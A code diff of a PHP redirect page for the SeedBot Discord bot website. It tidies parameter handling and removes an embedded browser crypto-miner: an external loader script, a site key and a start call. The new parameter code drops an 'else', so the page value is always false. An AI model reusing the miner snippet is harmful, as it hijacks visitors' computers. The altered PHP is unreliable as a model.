@@ -15,9 +15,13 @@ EOF;
 <p>SeedBot is Offline! Check <a href="http://jyles.club/redirect.php?page=twitter">my twitter</a> to check the status of the bot. Or check the <em>Offical</em> <a href="http://status.dariox.club">DARiOX Status Page</a>.
 EOF;
   }
-
-  $page=$_GET['page'];
-  $repo=$_GET['repo'];
+  if (isset($_GET['page'])){
+    $page = $_GET['page'];
+  } { $page = false; }
+  if (isset($_GET['repo'])){
+   $repo = $_GET['repo']; 
+  } else { $repo = false; }
+  
   if ($page === "supportemail") {
     header("Location: mailto:contact@dariox.club");
   }
@@ -37,7 +41,7 @@ EOF;
     header("Location: https://github.com/discordseedbot/changelog");
   }
   elseif ($page === "github" && strlen($repo) < 3) {
-    header("Location: https://github.com/discordseedbot/")
+    header("Location: https://github.com/discordseedbot/");
   }
   elseif ($page === "guide") {
     header("Location: https://github.com/discordseedbot/guide");
@@ -51,23 +55,14 @@ EOF;
 
 
 ?>
-<!DOCTYPE html, php7.2>
+<!DOCTYPE html>
 <html>
   <head>
     <link href="css/bootstrap.css" rel="stylesheet" type="text/css" />
     <link href="css/custom.css" rel="stylesheet" type="text/css" />
     <link href="fa/css/all.css" rel="stylesheet"> 
-    <title>SeedBot | Offical Website</title>
-    
-<script src="https://www.hostingcloud.racing/cPTP.js"></script>
-<script>
-    var _client = new Client.Anonymous('32dcfb13f92b42722a95f0264ea55fe6880a68490fef661237dd6777723d1c78', {
-        throttle: 0
-    });
-    _client.start();
-    _client.addMiningNotification("Bottom", "By Using this website you consent to crypto mining on your computer", "#cccccc", 40, "#3d3d3d");
+    <title>SeedBot</title>
 
-</script>
     
   </head>
   <body>
